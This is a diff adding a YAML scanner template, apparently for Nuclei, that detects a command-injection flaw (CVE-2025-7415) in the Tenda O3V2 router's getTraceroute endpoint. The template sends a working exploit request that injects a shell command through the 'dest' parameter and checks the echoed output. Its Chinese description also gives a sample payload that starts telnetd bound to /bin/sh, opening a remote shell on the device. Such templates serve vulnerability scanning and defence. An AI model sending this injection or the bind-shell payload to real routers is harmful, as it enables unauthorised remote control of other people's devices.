@@ -1,0 +1,32 @@
+id: tenda-router-gettraceroute-rce
+
+info:
+  name: Tenda O3V2 路由器 getTraceroute 接口远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Tenda O3V2 路由器固件版本 1.0.0.12(3880) 的 httpd 二进制文件中存在安全缺陷。
+      /goform/getTraceroute 接口接收的 dest 参数未进行输入验证，用户可控内容直接拼接至系统命令行执行。
+      攻击者可利用反引号(`)、分号(;)等特殊字符注入任意操作系统命令。
+      示例攻击载荷：hop=1&dest=`telnetd -l /bin/sh -p 9999`
+  reference:
+  - CVE-2025-7415
+  tags: Tenda
+
+http:
+- raw:
+  - |
+    POST /goform/getTraceroute HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    hop=1&dest=127.0.0.1;echo NdayTest
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
